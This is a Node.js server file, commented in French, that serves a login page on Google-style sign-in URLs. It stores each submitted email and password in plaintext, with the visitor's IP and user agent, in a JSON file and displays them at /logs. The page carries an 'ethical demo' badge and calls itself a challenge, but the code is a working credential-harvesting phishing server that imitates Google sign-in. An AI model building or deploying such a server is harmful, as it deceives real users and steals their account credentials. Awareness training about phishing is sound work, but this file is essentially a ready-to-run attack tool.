import http from 'node:http'
import fs from 'node:fs'
import fsp from 'node:fs/promises'
import path from 'node:path'
import { fileURLToPath } from 'node:url'

const __dirname = path.dirname(fileURLToPath(import.meta.url))
const PORT = process.env.PORT || 3000

// Emplacement du stockage JSON (créé à la volée s'il n'existe pas).
const DATA_DIR = path.join(__dirname, 'data')
const LOGS_FILE = path.join(DATA_DIR, 'logs.json')

const MINE = {
  '.html': 'text/html; charset=utf-8',
  '.css': 'text/css; charset=utf-8',
  '.js': 'application/javascript; charset=utf-8'
}

async function ensureLogs () {
  try { await fsp.access(LOGS_FILE) } catch {
    await fsp.mkdir(DATA_DIR, { recursive: true })
    await fsp.writeFile(LOGS_FILE, '[]', 'utf-8')
  }
}

async function readLogs () {
  try { return JSON.parse(await fsp.readFile(LOGS_FILE, 'utf-8')) } catch { return [] }
}

async function appendLog (rec) {
  await ensureLogs()
  const logs = await readLogs()
  logs.push(rec)
  await fsp.writeFile(LOGS_FILE, JSON.stringify(logs, null, 2) + '\n', 'utf-8')
  return logs
}

function getClientIp (req) {
  return req.headers['x-forwarded-for']?.split(',')[0]?.trim()
    || req.socket?.remoteAddress || req.socket?.remoteAddress || '-'
}

const formPath = path.join(__dirname, 'public', 'login.html')
const cssPath = path.join(__dirname, 'public', 'style.css')
const jsPath = path.join(__dirname, 'public', 'app.js')

async function sendStatic (res, file, mime) {
  try {
    res.writeHead(200, { 'Content-Type': mime })
    fs.createReadStream(file).pipe(res)
  } catch {
    res.writeHead(404)
    res.end('Not Found')
  }
}

const server = http.createServer(async (req, res) => {
  const url = new URL(req.url, 'http://localhost')
  const p = url.pathname

  // GET /  ou  GET /login  ou  GET /signin/v2/identifier?service=mail&...
  // -> sert le formulaire (chemin long style Google).
  if (
    req.method === 'GET' &&
    (p === '/' || p === '/login' || p.startsWith('/signin/v2/identifier'))
  ) {
    return sendStatic(res, formPath, MINE['.html'])
  }

  if (req.method === 'GET' && p === '/style.css') {
    return sendStatic(res, cssPath, MINE['.css'])
  }

  if (req.method === 'GET' && p === '/app.js') {
    return sendStatic(res, jsPath, MINE['.js'])
  }

  // POST /login -> persiste les données -> redirige 303 vers /logs.
  if (req.method === 'POST' && p === '/login') {
    const chunks = []
    for await (const chunk of req) chunks.push(chunk)
    const body = Buffer.concat(chunks).toString()
    const params = new URLSearchParams(body)
    const email = params.get('email') || ''
    const password = params.get('password') || ''

    await appendLog({
      email,
      password,
      ip: getClientIp(req),
      created_at: new Date().toISOString(),
      user_agent: req.headers['user-agent'] || ''
    })

    res.writeHead(303, { Location: '/logs' })
    return res.end()
  }

  // GET /logs -> affiche les données brutes (non chiffrées) depuis logs.json.
  if (req.method === 'GET' && p === '/logs') {
    await ensureLogs()
    const logs = await readLogs()
    const raw = JSON.stringify(logs, null, 2)
    const html = `<!doctype html>
<html lang="fr"><head><meta charset="utf-8">
<title>Logs - JSON brut</title>
<link rel="stylesheet" href="/style.css">
<style>body{background:#fff;color:#202124;font-family:roboto,arial;margin:0;padding:24px}
h1{font-size:20px}.badge{display:inline-block;background:#fce8e6;color:#c5221f;padding:2px 8px;border-radius:10px;font-size:12px;margin-left:8px}
pre{background:#f6f8fa;border:1px solid #e1e4e8;border-radius:6px;padding:16px;overflow:auto;font-size:12px}</style>
</head><body>
<h1>📦 logs.json — données brutes non chiffrées <span class="badge">démo éthique</span></h1>
<a href="/login">← Retour au formulaire</a>
<pre>${raw}</pre>
</body></html>`
    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' })
    return res.end(html)
  }

  res.writeHead(404, { 'Content-Type': 'text/plain; charset=utf-8' })
  res.end('404 Not Found')
})

await ensureLogs()
server.listen(PORT, '0.0.0.0', () => {
  console.log(`[défi] serveur écouté sur http://0.0.0.0:${PORT}`)
  console.log(`[défi] formulaire → http://localhost:${PORT}/signin/v2/identifier?service=mail&passive=1209638553&hl=fr&continue=/mail/&flowName=GlifWebSignIn`)
  console.log(`[défi] logs JSON brut → http://localhost:${PORT}/logs`)
})
